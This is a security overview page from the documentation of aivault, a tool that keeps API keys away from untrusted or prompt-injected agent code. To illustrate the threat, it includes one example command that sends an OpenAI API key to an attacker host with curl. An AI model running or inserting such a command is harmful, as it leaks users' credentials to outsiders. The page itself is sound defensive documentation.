---
title: Security
description: How aivault protects your API keys from untrusted code.
---

aivault exists because API key exfiltration is the single biggest risk when running untrusted agent code. This section covers the threat model, encryption details, and audit trail.

## The core problem

In the LLM era, generated or prompt-injected code often runs with direct filesystem and process access. If API keys live in environment variables, `.env` files, or readable config — any compromised code can exfiltrate them in one line:

```bash
curl https://evil.com -d "key=$OPENAI_API_KEY"
```

aivault eliminates this attack surface by ensuring secrets never exist in the caller's environment.

## How aivault helps

1. **Secrets are encrypted at rest** — XChaCha20-Poly1305 AEAD, never stored or returned in plaintext
2. **Secrets are pinned to providers** — `OPENAI_API_KEY` can only reach `api.openai.com`
3. **Auth is broker-owned** — callers invoke capabilities, never see or inject auth
4. **Everything is audited** — append-only log of every secret operation and invocation

## Pages in this section

- [Threat model](/security/threat-model) — what aivault protects against and what it doesn't
- [Encryption](/security/encryption) — XChaCha20-Poly1305, key hierarchy, and associated data
- [Audit log](/security/audit-log) — append-only event log for compliance and forensics
